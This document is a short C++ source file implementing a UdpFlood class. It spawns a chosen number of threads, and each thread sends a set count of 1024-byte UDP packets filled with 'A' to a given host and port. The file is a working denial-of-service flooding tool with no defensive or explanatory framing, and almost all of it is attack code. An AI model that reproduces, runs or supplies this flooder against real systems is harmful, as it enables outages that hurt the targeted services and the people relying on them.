#include "UdpFlood.h"
#include <iostream>
#include <cstring>
#include <arpa/inet.h>
#include <unistd.h>

UdpFlood::UdpFlood(const std::string& host, uint16_t port, size_t threads, size_t packets)
    : targetHost(host), targetPort(port), threadCount(threads), packetCount(packets) {}

void UdpFlood::performFlood() {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return;
    }

    struct sockaddr_in targetAddr;
    targetAddr.sin_family = AF_INET;
    targetAddr.sin_port = htons(targetPort);
    inet_pton(AF_INET, targetHost.c_str(), &targetAddr.sin_addr);

    char buffer[1024];
    memset(buffer, 'A', sizeof(buffer));

    for (size_t i = 0; i < packetCount; ++i) {
        sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&targetAddr, sizeof(targetAddr));
    }

    close(sockfd);
}

void UdpFlood::start() {
    std::vector<std::thread> threads;
    for (size_t i = 0; i < threadCount; ++i) {
        threads.emplace_back([this]() { this->performFlood(); });
    }

    for (auto& thread : threads) {
        thread.join();
    }
}
